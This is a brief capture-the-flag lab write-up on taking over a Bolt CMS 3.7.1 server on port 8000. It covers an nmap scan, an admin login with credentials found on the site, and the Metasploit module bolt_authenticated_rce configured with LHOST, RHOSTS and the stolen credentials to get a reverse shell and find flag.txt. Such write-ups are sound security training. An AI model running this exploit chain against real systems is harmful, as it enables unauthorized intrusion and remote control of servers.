Started with initial enum
```bash
nmap -sS 10.10.45.125
```
got 3 ports running:
- ssh -22
- http - 80
- http-alt -8000

nothing at 80 just a default ubuntu server page
at 8000 we got the bolt CMS website that we are going to penetrate
analysing the website we get the username "bolt" and Password "boltadmin123"
tried /admin and other endpoints but nothing found, then googled it and got that the admin login panel is at /bolt endpoint 
we as we have the username and password for the user we can just easily log into it and boom we are in it
got the version of bolt CMS it is running - 3.7.1
searched for  exploit but it is for a previous version, now trying the DB of metasploit

got an exploit there for the current version
```bash
exploit/unix/webapp/bolt_authenticated_rce
```

set up all the required details like LHOST, LPORT, RHOST, USERNAME, PASSWORD,etc
```bash
msf6 exploit(unix/webapp/bolt_authenticated_rce) > set LHOST 10.17.12.148
LHOST => 10.17.12.148
msf6 exploit(unix/webapp/bolt_authenticated_rce) > set RHOSTS 10.10.45.125
RHOSTS => 10.10.45.125
msf6 exploit(unix/webapp/bolt_authenticated_rce) > set RPORT 8000
RPORT => 8000
msf6 exploit(unix/webapp/bolt_authenticated_rce) > set USERNAME bolt
USERNAME => bolt
msf6 exploit(unix/webapp/bolt_authenticated_rce) > set PASSWORD boltadmin123
PASSWORD => boltadmin123
```

and after setting it up we can now run it and hopefully we get a shell for it
```bash
msf6 exploit(unix/webapp/bolt_authenticated_rce) > run
```

boom we got a shell for it, now lets get the flag.txt
```bash
find / -name flag.txt
```

got the location and viewed the flag.txt

and we solve the lab boom !!
